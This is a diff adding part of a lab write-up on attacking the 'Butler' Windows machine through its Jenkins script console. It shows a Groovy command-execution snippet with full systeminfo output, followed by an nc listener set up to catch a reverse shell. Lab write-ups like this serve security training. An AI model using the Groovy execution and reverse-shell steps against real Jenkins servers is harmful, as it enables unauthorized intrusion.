@@ -313,6 +313,74 @@ Through right clicking and Requesting the url in browser, an attempt to input ht
 
 ![image](https://github.com/user-attachments/assets/7ad81ed6-0368-40a7-8065-73b071948f1b)
 
+Tried the above url and input -ssh -user as jenkins with no success.
+
+looked further on jenkins webpanel and discovered the 'script console' at http://192.168.64[.]136:8080/script.
+
+![image](https://github.com/user-attachments/assets/fbb55ff0-e173-409a-a4e1-b4dee587bca7)
+
+From this simple Groovy Script command we are user butler\butler.. very interesting here. (potentially already compromised into target) however further enumeration is required. We should look at creating a reverse shell further down the line as well.
+    
+    def cmd1 = "systeminfo".execute()
+    println cmd1.text
+
+    Result
+
+    Host Name:                 BUTLER
+    OS Name:                   Microsoft Windows 10 Enterprise Evaluation
+    OS Version:                10.0.19043 N/A Build 19043
+    OS Manufacturer:           Microsoft Corporation
+    OS Configuration:          Standalone Workstation
+    OS Build Type:             Multiprocessor Free
+    Registered Owner:          butler
+    Registered Organization:   
+    Product ID:                00329-20000-00001-AA079
+    Original Install Date:     8/14/2021, 3:51:38 AM
+    System Boot Time:          12/28/2024, 9:00:28 PM
+    System Manufacturer:       VMware, Inc.
+    System Model:              VMware7,1
+    System Type:               x64-based PC
+    Processor(s):              2 Processor(s) Installed.
+                               [01]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~3000 Mhz
+                               [02]: Intel64 Family 6 Model 158 Stepping 13 GenuineIntel ~3000 Mhz
+    BIOS Version:              VMware, Inc. VMW71.00V.14410784.B64.1908150010, 8/15/2019
+    Windows Directory:         C:\Windows
+    System Directory:          C:\Windows\system32
+    Boot Device:               \Device\HarddiskVolume1
+    System Locale:             en-us;English (United States)
+    Input Locale:              en-us;English (United States)
+    Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
+    Total Physical Memory:     2,047 MB
+    Available Physical Memory: 1,557 MB
+    Virtual Memory: Max Size:  3,199 MB
+    Virtual Memory: Available: 2,278 MB
+    Virtual Memory: In Use:    921 MB
+    Page File Location(s):     C:\pagefile.sys
+    Domain:                    WORKGROUP
+    Logon Server:              N/A
+    Hotfix(s):                 4 Hotfix(s) Installed.
+                               [01]: KB4601554
+                               [02]: KB5000736
+                               [03]: KB5001330
+                               [04]: KB5001405
+    Network Card(s):           1 NIC(s) Installed.
+                               [01]: Intel(R) 82574L Gigabit Network Connection
+                                     Connection Name: Ethernet0
+                                     DHCP Enabled:    Yes
+                                     DHCP Server:     192.168.64.254
+                                     IP address(es)
+                                     [01]: 192.168.64.136
+                                     [02]: fe80::cc33:3da3:d101:d60e
+    Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+
+Above systeminfo shows us that the victim machine is operating on win10. To make things easier we will just try to establish a reverse shell to our box.
+
+    root@kali:/home/kali/Downloads# nc -nlvp 5555
+    listening on [any] 5555 ...
+
+![image](https://github.com/user-attachments/assets/2ab7f09f-dc17-44e6-9375-2a6334e9e124)
+Succesful.
+
 
 
 ### Jenkins exploitation study: https://blog.orange.tw/posts/2019-01-hacking-jenkins-part-1-play-with-dynamic-routing/
